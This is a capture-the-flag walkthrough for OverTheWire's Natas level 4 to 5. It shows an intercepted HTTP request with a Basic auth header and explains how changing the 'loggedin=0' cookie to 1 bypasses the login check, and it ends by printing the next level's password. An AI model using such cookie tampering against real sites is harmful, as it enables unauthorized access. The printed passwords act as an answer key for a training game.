`Link` : `https://overthewire.org/wargames/natas/natas5.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟒 - 𝐋𝐞𝐯𝐞𝐥 𝟓

## 𝐆𝐢𝐯𝐞𝐧

- Username: natas5
- URL:      `http://natas5.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:      `http://natas5.natas.labs.overthewire.org`
- Notice it says you ain't logged in even if you are!
- Let's check why does that happen.
- Analyze the request (refresh the page & intercept):

 ```
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Cookie: loggedin=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

- Note: `Cookie: loggedin=0`. In programming `0` means false. Change it to `1`
- `Cookie: loggedin=1`
- Boom! 

<div align='center'>
  <img src=https://user-images.githubusercontent.com/68887544/148731291-63368d4e-236d-40b6-8d51-e9901e3255a5.png width=500px>
</div>

- Access granted. The password for natas6 is `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
